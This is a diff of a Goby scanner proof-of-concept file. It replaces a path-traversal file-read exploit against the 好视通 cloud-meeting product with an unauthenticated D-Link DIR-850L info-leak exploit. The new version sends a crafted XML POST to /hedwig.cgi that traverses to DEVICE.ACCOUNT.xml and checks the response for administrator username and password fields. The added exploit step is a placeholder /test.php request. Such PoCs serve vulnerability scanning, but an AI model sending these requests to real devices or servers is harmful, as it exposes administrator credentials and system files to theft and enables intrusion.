@@ -1,27 +1,21 @@
 {
-      "Name": "好视通云会议存在任意文件读取漏洞",
-      "Level": "2",
+      "Name": "Dlink 850L Info Leak",
+      "Level": "3",
       "Tags": [
-            "fileread"
+            "infoleak"
       ],
-      "GobyQuery": "body=\"深圳银澎云计算有限公司\"",
-      "Description": "好视通云会议存在任意文件读取漏洞",
-      "Product": "好视通云会议",
-      "Homepage": "https://www.hst.com/",
+      "GobyQuery": "(app=\"DIR-850L\" | title==\"DIR-850L\")",
+      "Description": "D-Link 850L 发现可以未授权加载 htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php 文件并获得管理员账号密码等敏感信息",
+      "Product": "DIR-850L",
+      "Homepage": "http://www.dlink.com.cn/",
       "Author": "aetkrad",
       "Impact": "",
       "Recommendation": "",
       "References": [
-            "https://mp.weixin.qq.com/s/fMNE1PF5n81O1BpoDRlYkA"
+            "https://xz.aliyun.com/t/2941"
       ],
       "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "Filepath",
-                  "Type": "input",
-                  "Value": "../../../../../../../../../../../../../../windows/win.ini"
-            }
-      ],
+      "ExpParams": null,
       "ExpTips": {
             "Type": "",
             "Content": ""
@@ -30,12 +24,15 @@
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini",
+                        "method": "POST",
+                        "uri": "/hedwig.cgi",
                         "follow_redirect": false,
-                        "header": null,
+                        "header": {
+                              "Content-Type": "text/xml",
+                              "Cookie": "uid=R8tBjwtFc7"
+                        },
                         "data_type": "text",
-                        "data": "",
+                        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>",
                         "set_variable": []
                   },
                   "ResponseTest": {
@@ -53,44 +50,21 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "[fonts]",
+                                    "value": "&lt;/usrid&gt;",
                                     "bz": ""
                               },
                               {
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "[extensions]",
+                                    "value": "&lt;/password&gt;",
                                     "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
-            }
-      ],
-      "ExploitSteps": [
-            "AND",
-            {
-                  "Request": {
-                        "method": "GET",
-                        "uri": "/register/toDownload.do?fileName={{{Filepath}}}",
-                        "follow_redirect": false,
-                        "header": null,
-                        "data_type": "text",
-                        "data": "",
-                        "set_variable": []
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
+                              },
                               {
                                     "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "&lt;result&gt;OK&lt;/result&gt;",
                                     "bz": ""
                               }
                         ]
@@ -100,6 +74,43 @@
                   ]
             }
       ],
-      "PostTime": "2021-12-11 14:50:39",
-      "GobyVersion": "1.9.310"
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-24 19:23:42",
+      "GobyVersion": "1.8.302"
 }
